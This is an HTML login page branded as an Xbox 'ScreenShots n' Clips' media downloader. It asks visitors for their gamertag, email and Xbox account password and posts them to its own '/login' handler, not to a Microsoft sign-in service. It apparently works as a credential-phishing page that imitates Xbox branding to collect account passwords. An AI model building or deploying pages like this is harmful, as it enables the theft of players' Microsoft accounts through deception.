<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XBOX ScreenNClips</title>
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Google Fonts - Poppins -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">

    <!-- Custom Styles for the Gamer Theme -->
    <style>
        :root {
            --xbox-green: #107C10;
            --dark-bg: #1e1e1e;
            --card-bg: #2d2d2d;
            --light-text: #f8f9fa;
            --gray-text: #adb5bd;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--dark-bg);
            color: var(--light-text);
        }

        .main-container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-card {
            background-color: var(--card-bg);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 0.75rem;
            padding: 2.5rem;
            max-width: 450px;
            width: 100%;
        }

        .form-control {
            background-color: #3d3d3d;
            border: 1px solid #555;
            color: var(--light-text);
            border-radius: 0.5rem;
        }
        
        .form-control:focus {
            background-color: #4a4a4a;
            border-color: var(--xbox-green);
            box-shadow: 0 0 0 0.25rem rgba(16, 124, 16, 0.25);
            color: var(--light-text);
        }
        
        .form-control::placeholder {
            color: var(--gray-text);
        }
        
        .form-label {
            color: var(--gray-text);
        }
        
        .btn-submit {
            background-color: var(--xbox-green);
            border-color: var(--xbox-green);
            color: var(--light-text);
            font-weight: 600;
            padding: 0.75rem;
            border-radius: 0.5rem;
            transition: all 0.2s ease-in-out;
        }

        .btn-submit:hover {
            background-color: #139613;
            border-color: #139613;
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(16, 124, 16, 0.3);
        }
        
        .card-title {
            font-weight: 700;
            color: var(--light-text);
        }
        
        .card-subtitle {
            color: var(--gray-text);
        }
    </style>
</head>
<body>

    <div class="container main-container">
        <div class="login-card shadow-lg">
            <!-- Header Text -->
            <div class="text-center mb-4">
                <h1 class="card-title">ScreenShots n' Clips</h1>
                <p class="card-subtitle">Sign in to your Xbox account to download your media.</p>
            </div>

            <!-- Login Form -->
            <form action="/login" method="post">
                <div class="mb-3">
                    <label for="gamertag" class="form-label">Gamertag</label>
                    <input type="text" class="form-control" id="gamertag" name="gamertag" required placeholder="e.g., MasterChief117">
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email address</label>
                    <input type="email" class="form-control" id="email" name="email" required placeholder="you@example.com">
                </div>
                <div class="mb-4">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required placeholder="••••••••">
                </div>
                <div class="d-grid">
                     <input type="submit" value="Sign In" class="btn btn-submit" />
                </div>
            </form>
        </div>
    </div>

    <!-- Bootstrap JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
